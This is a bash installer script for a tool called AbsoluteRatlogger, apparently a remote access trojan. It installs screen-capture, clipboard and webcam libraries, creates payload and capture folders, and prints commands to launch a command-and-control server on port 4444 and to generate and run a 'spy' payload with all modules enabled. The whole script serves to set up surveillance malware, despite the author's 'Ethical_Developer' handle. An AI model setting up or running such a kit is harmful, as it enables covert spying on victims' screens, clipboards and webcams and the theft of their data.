#!/bin/bash
# AbsoluteRatlogger — one-command setup for Linux/Kali
# Author: @Ethical_Developer

set -e

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║         AbsoluteRatlogger — Auto Setup                     ║"
echo "║         Author: @Ethical_Developer                    ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "[!] Python 3 not found. Install: sudo apt install python3 python3-pip"
    exit 1
fi

echo "[1/4] Installing Python dependencies..."
pip3 install --user pycryptodome aiohttp Pillow 2>/dev/null || \
    pip3 install pycryptodome aiohttp Pillow

echo ""
echo "[2/4] Installing system tools (screen capture, clipboard)..."
sudo apt update -qq 2>/dev/null || true
sudo apt install -y -qq scrot xclip imagemagick 2>/dev/null || \
    echo "    (some tools may need manual install)"

echo ""
echo "[3/4] Optional: install OpenCV for webcam support..."
pip3 install --user opencv-python 2>/dev/null || \
    echo "    (optional — only needed for webcam)"

echo ""
echo "[4/4] Creating directories..."
mkdir -p payloads/built captures downloads
echo "    [+] Created: payloads/built, captures, downloads"

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║  Setup complete!                                     ║"
echo "╠══════════════════════════════════════════════════════╣"
echo "║                                                      ║"
echo "║  Quick start:                                        ║"
echo "║    python3 absolutespy.py test                       ║"
echo "║                                                      ║"
echo "║  Manual:                                             ║"
echo "║    python3 absolutespy.py server --port 4444 --web   ║"
echo "║    python3 absolutespy.py generate --platform linux  ║"
echo "║      --output spy --c2 127.0.0.1:4444 --modules all  ║"
echo "║    python3 payloads/built/spy.py                     ║"
echo "║                                                      ║"
echo "╚══════════════════════════════════════════════════════╝"
